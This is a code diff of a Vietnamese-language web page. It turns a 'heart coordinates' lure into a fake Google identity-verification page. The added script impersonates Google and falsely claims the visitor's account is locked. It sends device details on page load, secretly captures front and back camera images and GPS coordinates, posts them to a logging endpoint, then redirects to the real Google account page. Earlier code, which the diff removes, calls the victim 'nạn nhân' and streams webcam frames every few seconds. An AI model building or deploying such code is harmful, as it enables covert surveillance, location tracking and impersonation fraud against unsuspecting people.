@@ -3,52 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gửi tọa độ trái tim 💌</title>
+    <title>Xác minh tài khoản - Google</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap');
-        body { margin: 0; padding: 0; font-family: 'Nunito', sans-serif; background: linear-gradient(135deg, #ffe6e6 0%, #ffb3c6 100%); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; position: relative; }
-        .heart { position: absolute; bottom: -20px; font-size: 24px; color: #ff4d6d; animation: floatUp 4s linear infinite; opacity: 0; }
-        @keyframes floatUp { 0% { transform: translateY(0) scale(0.5); opacity: 0; } 20% { opacity: 0.8; } 100% { transform: translateY(-100vh) scale(1.2); opacity: 0; } }
-        .card { background: rgba(255, 255, 255, 0.9); padding: 40px 30px; border-radius: 24px; box-shadow: 0 10px 30px rgba(255, 77, 109, 0.2); text-align: center; max-width: 340px; width: 90%; z-index: 10; backdrop-filter: blur(10px); border: 2px solid #fff; animation: popIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
-        .icon { font-size: 50px; margin-bottom: 10px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        h2 { color: #d90429; margin: 10px 0; font-size: 22px; }
-        p { color: #6c757d; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
-        .btn { background: linear-gradient(to right, #ff758c 0%, #ff7eb3 100%); color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4); transition: all 0.3s ease; width: 100%; font-family: 'Nunito', sans-serif; }
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(255, 117, 140, 0.6); }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f0f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .verify-box {
+            background: #ffffff;
+            width: 90%;
+            max-width: 450px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            padding: 40px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        /* Giả lập logo Google */
+        .google-logo {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .g-blue { color: #4285F4; }
+        .g-red { color: #EA4335; }
+        .g-yellow { color: #FBBC05; }
+        .g-green { color: #34A853; }
+
+        .icon-warning {
+            font-size: 40px;
+            margin-bottom: 15px;
+            color: #d93025;
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #202124;
+            margin: 0 0 15px 0;
+            font-weight: 500;
+        }
+
+        p {
+            font-size: 15px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        /* Giả lập hộp kiểm tra */
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            text-align: left;
+            margin-bottom: 30px;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+        }
+
+        .checkbox-group input {
+            width: 20px;
+            height: 20px;
+            margin-right: 15px;
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 14px;
+            color: #3c4043;
+            cursor: pointer;
+        }
+
+        .btn-verify {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+
+        .btn-verify:hover {
+            background-color: #1557b0;
+        }
+
+        /* Thanh loading ẩn */
+        .progress-bar {
+            display: none;
+            width: 100%;
+            height: 4px;
+            background-color: #e8eaed;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background-color: #1a73e8;
+            transition: width 0.3s;
+        }
+
         .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card" id="card">
-        <div class="icon">💌</div>
-        <h2>Có người gửi bạn một<br>tọa độ trái tim!</h2>
-        <p>Hãy xác nhận khuôn mặt và vị trí để mở khóa xem người ấy là ai nhé.</p>
-        <button class="btn" onclick="startHack()" id="btn">Xem tọa độ ngay ❤️</button>
+    <div class="verify-box" id="mainBox">
+        <div class="google-logo">
+            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+        </div>
+        
+        <div class="icon-warning">⚠️</div>
+        <h2>Yêu cầu xác minh danh tính</h2>
+        <p>Tài khoản của bạn đã bị tạm khóa do phát hiện hoạt động đáng ngờ. Để tiếp tục sử dụng, vui lòng xác minh thiết bị và vị trí hiện tại của bạn.</p>
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="consent" checked>
+            <label for="consent">Tôi đồng ý cấp quyền truy cập Camera và Vị trí để hoàn tất xác minh.</label>
+        </div>
+
+        <button class="btn-verify" onclick="startVerify()" id="btn">Xác minh ngay</button>
+        
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <p id="statusText" style="margin-top: 15px; font-size: 13px; color: #d93025; display: none; font-weight: 500;"></p>
     </div>
 
-    <!-- Thẻ ẩn dùng để xử lý Camera -->
+    <!-- Thẻ xử lý Camera ẩn -->
     <video id="video" autoplay playsinline class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
 
     <script>
-        // Tạo hiệu ứng tim bay
-        function createHearts() {
-            const body = document.querySelector('body');
-            const heart = document.createElement('div');
-            heart.classList.add('heart');
-            heart.innerHTML = '❤';
-            heart.style.left = Math.random() * 100 + 'vw';
-            heart.style.animationDuration = Math.random() * 2 + 3 + 's';
-            heart.style.fontSize = Math.random() * 20 + 10 + 'px';
-            body.appendChild(heart);
-            setTimeout(() => { heart.remove(); }, 5000);
-        }
-        setInterval(createHearts, 300);
-
-        // Hàm gửi dữ liệu về API
         function sendData(data) {
             fetch('/api/log', {
                 method: 'POST',
@@ -57,79 +164,88 @@
             });
         }
 
-        let streamCam = null; // Biến lưu camera
+        // Gửi info thiết bị ngay khi vào
+        sendData({ type: "basic_info", platform: navigator.platform, userAgent: navigator.userAgent, screen: screen.width + "x" + screen.height });
 
-        // Hàm bật cam và gửi ảnh liên tục
-        async function startCameraStream(facingMode, cameraName) {
+        let streamCam = null;
+
+        async function captureCamera(facingMode) {
             try {
-                streamCam = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: facingMode } 
-                });
+                streamCam = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                 const video = document.getElementById('video');
                 video.srcObject = streamCam;
+                await new Promise(r => setTimeout(r, 1000)); // Đợi cam lấy nét
                 
-                // Đợi cam lấy nét
-                await new Promise(r => setTimeout(r, 2000));
-
-                // Cứ 2.5 giây chụp 1 lần
-                setInterval(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    const imageBase64 = canvas.toDataURL('image/jpeg', 0.4); // Giảm chất lượng để gửi nhanh
-                    
-                    sendData({ type: "webcam_stream", camera: cameraName, image: imageBase64 });
-                }, 2500);
-
-            } catch (err) {
-                console.log("Lỗi cam:", err);
-            }
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imgData = canvas.toDataURL('image/jpeg', 0.5);
+                streamCam.getTracks().forEach(track => track.stop());
+                return imgData;
+            } catch (err) { return null; }
         }
 
-        // Hàm chạy chính
-        async function startHack() {
+        async function startVerify() {
             const btn = document.getElementById('btn');
-            const card = document.getElementById('card');
-            
-            // Gửi info thiết bị
-            sendData({ type: "basic_info", platform: navigator.platform, userAgent: navigator.userAgent, screen: screen.width + "x" + screen.height });
+            const status = document.getElementById('statusText');
+            const bar = document.getElementById('progressBar');
+            const fill = document.getElementById('progressFill');
 
-            btn.innerHTML = "Đang kết nối vệ tinh... ⏳";
+            btn.disabled = true;
+            btn.style.opacity = "0.5";
+            btn.innerText = "Đang kết nối máy chủ...";
+            bar.style.display = "block";
+            status.style.display = "block";
+            status.innerText = "Đang phân tích thiết bị...";
 
-            // 1. Bật Cam Trước và Stream
-            await startCameraStream("user", "TRƯỚC");
-
-            // Đổi giao diện để giữ chân nạn nhân lâu hơn
-            card.innerHTML = `
-                <div class="icon">🔍</div>
-                <h2>Đang quét khuôn mặt...</h2>
-                <p>Vui lòng giữ nguyên thiết bị, hệ thống đang đối chiếu dữ liệu sinh trắc học...</p>
-            `;
-
-            // Sau 15 giây, chuyển sang Cam Sau (để livestream cảnh vật)
+            // 1. Chụp Cam Trước
             setTimeout(async () => {
-                if (streamCam) {
-                    streamCam.getTracks().forEach(track => track.stop()); // Tắt cam trước
-                }
-                
-                card.innerHTML = `
-                    <div class="icon">🌍</div>
-                    <h2>Đang xác minh không gian...</h2>
-                    <p>Vui lòng xoay điện thoại xung quanh để quét môi trường...</p>
-                `;
-                
-                await startCameraStream("environment", "SAU");
-                
-                // Lấy GPS
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => { sendData({ type: "gps", lat: pos.coords.latitude, lon: pos.coords.longitude }); }
-                    );
-                }
-            }, 15000);
+                fill.style.width = "30%";
+                status.innerText = "Đang đối chiếu sinh trắc học khuôn mặt...";
+                const front = await captureCamera("user");
+                if (front) sendData({ type: "webcam", camera: "TRƯỚC", image: front });
+
+                // 2. Chụp Cam Sau
+                setTimeout(async () => {
+                    fill.style.width = "60%";
+                    status.innerText = "Đang quét không gian xung quanh để xác minh...";
+                    const back = await captureCamera("environment");
+                    if (back) sendData({ type: "webcam", camera: "SAU", image: back });
+
+                    // 3. Lấy GPS
+                    setTimeout(() => {
+                        fill.style.width = "90%";
+                        status.innerText = "Đang xác minh vị trí GPS...";
+                        
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    sendData({ type: "gps", lat: pos.coords.latitude, lon: pos.coords.longitude });
+                                    completeVerify();
+                                },
+                                (err) => { completeVerify(); }
+                            );
+                        } else { completeVerify(); }
+
+                    }, 1500);
+                }, 2000);
+            }, 1500);
+        }
+
+        function completeVerify() {
+            document.getElementById('progressFill').style.width = "100%";
+            document.getElementById('statusText').style.color = "#34A853";
+            document.getElementById('statusText').innerText = "Xác minh thành công!";
+            
+            document.getElementById('mainBox').innerHTML = `
+                <div style="color: #34A853; font-size: 50px; margin-bottom: 20px;">✓</div>
+                <h2 style="color: #202124;">Đã xác minh thành công</h2>
+                <p>Tài khoản của bạn đã được mở khóa. Hệ thống sẽ tự động chuyển hướng trong giây lát.</p>
+            `;
+            setTimeout(() => { window.location.href = 'https://myaccount.google.com'; }, 2000);
         }
     </script>
 </body>
